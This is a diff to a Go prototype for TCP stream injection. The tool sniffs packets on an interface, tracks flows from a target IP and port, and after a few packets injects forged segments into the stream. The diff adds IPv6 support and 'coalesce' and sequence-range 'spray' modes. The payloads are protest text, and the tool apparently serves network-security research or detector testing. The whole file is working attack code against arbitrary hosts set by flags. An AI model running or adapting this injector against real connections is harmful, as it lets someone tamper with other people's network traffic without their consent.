@@ -1,5 +1,5 @@
 /*
- *    probabalistic/sloppy TCP stream injection based on observed TCP sequences
+ *    rough but working prototype; probabalistic ordered coalesce TCP stream injector!
  *
  *    Copyright (C) 2014, 2015  David Stainton
  *
@@ -19,6 +19,7 @@
 
 package main
 
+
 import (
 	"flag"
 	"fmt"
@@ -32,11 +33,15 @@ import (
 	"net"
 )
 
+
 var iface = flag.String("i", "lo", "Interface to get packets from")
 var filter = flag.String("f", "tcp", "BPF filter for pcap")
 var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
 var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
 var servicePort = flag.Int("e", 9666, "target TCP flows from this port")
+var coalesce1 = flag.Bool("coalesce1", true, "perform the TCP coalesce1 injection")
+var coalesce2 = flag.Bool("coalesce2", true, "perform the TCP coalesce2 injection")
+var spray = flag.Bool("spray", true, "perform the TCP sloppy probalistic injection")
 
 func main() {
 	defer util.Run()()
@@ -48,30 +53,40 @@ func main() {
 	var ip6extensions layers.IPv6ExtensionSkipper
 	var tcp layers.TCP
 	var payload gopacket.Payload
+
 	decoded := make([]gopacket.LayerType, 0, 4)
 
 	// target/track all TCP flows from this TCP/IP service endpoint
 	trackedFlows := make(map[types.TcpIpFlow]int)
 	serviceIP := net.ParseIP(*serviceIPstr)
+
 	if serviceIP == nil {
 		panic(fmt.Sprintf("non-ip target: %q\n", serviceIPstr))
 	}
-	serviceIP = serviceIP.To4()
-	if serviceIP == nil {
-		panic(fmt.Sprintf("non-ipv4 target: %q\n", serviceIPstr))
+
+	ipv4_mode := false
+	ipv6_mode := false
+	if serviceIP.To4() != nil {
+		log.Print("using ipv4 mode")
+		ipv4_mode = true
+	} else if len(serviceIP) == 16 {
+		log.Print("using ipv6 mode")
+		ipv6_mode = true
+	} else {
+		panic("wtf")
 	}
 
-	streamInjector := attack.TCPStreamInjector{}
-	err := streamInjector.Init("0.0.0.0")
-	if err != nil {
-		panic(err)
-	}
-	streamInjector.Payload = []byte("meowmeowmeow")
+	gap_payload := []byte("Many of these well-funded state/world-class adversaries are able to completely automate the compromising of computers using these TCP injection attacks against real people to violate their human rights.")
+	attack_payload := []byte("Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn't want the whole world to know, but a secret matter is something one doesn't want anybody to know. Privacy is the power to selectively reveal oneself to the world.")
+
 
 	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
 	if err != nil {
 		log.Fatal("error opening pcap handle: ", err)
 	}
+
+	streamInjector := attack.NewTCPStreamInjector(handle, ipv6_mode)
+
 	if err := handle.SetBPFFilter(*filter); err != nil {
 		log.Fatal("error setting BPF filter: ", err)
 	}
@@ -82,7 +97,7 @@ func main() {
 	log.Print("collecting packets...\n")
 
 	for {
-		data, ci, err := handle.ZeroCopyReadPacketData()
+		data, ci, err := handle.ReadPacketData()
 		if err != nil {
 			log.Printf("error getting packet: %v %s", err, ci)
 			continue
@@ -93,32 +108,87 @@ func main() {
 			continue
 		}
 
-		// if we see a flow coming from the tcp/ip service we are watching
-		// then track how many packets we receive from each flow
-		if tcp.SrcPort == layers.TCPPort(*servicePort) && ip4.SrcIP.Equal(serviceIP) {
-			flow = types.NewTcpIpFlowFromLayers(ip4, tcp)
-			_, isTracked := trackedFlows[*flow]
-			if isTracked {
-				trackedFlows[*flow] += 1
-			} else {
-				trackedFlows[*flow] = 1
-			}
-		} else {
+		foundIPv6 := false
+		foundIPv4 := false
+		foundTcpLayer := false
+		for _, typ := range decoded {
+			switch typ {
+			case layers.LayerTypeIPv4:
+				foundIPv4 = true
+			case layers.LayerTypeIPv6:
+				foundIPv6 = true
+			case layers.LayerTypeTCP:
+				if foundIPv4 || foundIPv6 {
+					foundTcpLayer = true
+				}
+			} // switch
+		} // for
+
+		if !foundTcpLayer {
+			continue
+		}
+		if ipv4_mode && foundIPv6 {
+			continue
+		}
+		if ipv6_mode && foundIPv4 {
 			continue
 		}
 
-		// after 3 packets from a given flow then inject packets into the stream
-		if trackedFlows[*flow]%10 == 0 {
-			err = streamInjector.SetIPLayer(ip4)
+		if ipv4_mode {
+//			if tcp.SrcPort != layers.TCPPort(*servicePort) || !ip4.SrcIP.Equal(serviceIP.To4()) {
+			if tcp.SrcPort != layers.TCPPort(*servicePort) || !ip4.SrcIP.Equal(serviceIP) {
+				continue
+			}
+		} else if ipv6_mode {
+			if tcp.SrcPort != layers.TCPPort(*servicePort) || !ip6.SrcIP.Equal(serviceIP) {
+				continue
+			}
+		} else {
+			panic("wtf")
+		}
+
+		if foundIPv4 == true {
+			flow = types.NewTcpIpFlowFromLayers(ip4, tcp)
+		} else if foundIPv6 == true {
+			f := types.NewTcpIpFlowFromFlows(ip6.NetworkFlow(), tcp.TransportFlow())
+			flow = &f
+		} else {
+			panic("wtf")
+		}
+		_, isTracked := trackedFlows[*flow]
+		if isTracked {
+			trackedFlows[*flow] += 1
+		} else {
+			trackedFlows[*flow] = 1
+		}
+
+		// after some packets from a given flow then inject packets into the stream
+		if trackedFlows[*flow] == 5 {
+			streamInjector.SetEthernetLayer(&eth)
+			if ipv4_mode {
+				streamInjector.SetIPv4Layer(ip4)
+			} else if ipv6_mode {
+				streamInjector.SetIPv6Layer(ip6)
+			} else {
+				panic("wtf")
+			}
 			if err != nil {
 				panic(err)
 			}
+
 			streamInjector.SetTCPLayer(tcp)
-			err = streamInjector.SpraySequenceRangePackets(tcp.Seq, 20)
+			// choose which injection attack to perform
+			if *coalesce1 {
+				err = streamInjector.SprayFutureAndFillGapPackets(tcp.Seq, gap_payload, attack_payload, *coalesce1)
+			} else if *coalesce2 {
+				err = streamInjector.SprayFutureAndFillGapPackets(tcp.Seq, gap_payload, attack_payload, *coalesce2)
+			} else if *spray {
+				err = streamInjector.SpraySequenceRangePackets(tcp.Seq, 20)
+			}
 			if err != nil {
 				panic(err)
 			}
-			log.Print("packet spray sent!\n")
+			log.Print("tcp injection sent!\n")
 		}
 	}
 }
